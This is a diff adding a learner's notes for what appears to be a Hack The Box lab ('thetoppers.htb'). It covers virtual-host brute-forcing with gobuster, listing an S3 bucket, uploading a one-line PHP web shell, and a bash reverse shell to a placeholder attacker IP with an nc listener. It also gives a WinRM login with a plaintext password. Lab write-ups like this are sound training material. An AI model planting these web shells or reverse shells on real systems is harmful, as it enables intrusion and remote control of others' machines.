@@ -33,6 +33,8 @@ cycles, without requiring all the services to be used by the same hostname.
 The web server checks the domain name provided in the Host header field of the HTTP request and sends
 a response according to that
 
+echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
+
 dir : Uses directory/file enumeration mode.
 --url : The target URL.
 --wordlist : Path to the wordlist.
@@ -113,3 +115,48 @@ We'll connect to the WinRM service on the target and try to get a session. Becau
 on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario.
 
 evil-winrm -i 10.129.136.91 -u administrator -p badminton
+
+
+gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u
+http://thetoppers.htb
+
+vhost : Uses VHOST for brute-forcing
+-w : Path to the wordlist
+-u : Specify the URL
+
+If using Gobuster version 3.2.0 and above we also have to add the --append-domain flag to our
+command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
+to the words found in the wordlist ( word.thetoppers.htb )
+
+Find directory 
+find / -type d -name 'httpdocs'
+
+GoBuster will send out requests with a host header that looks like the following for each word in the
+wordlist:
+It will note the default response, and show any that return something different.
+echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
+gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u
+http://thetoppers.htb
+vhost : Uses VHOST for brute-forcing
+-w : Path to the wordlist
+-u : Specify the URL
+Host: [word].thetoppers.htb
+
+
+aws configure (everything put temp)
+
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php  
+
+Reverse shell
+
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+
+nc -nvlp 1337
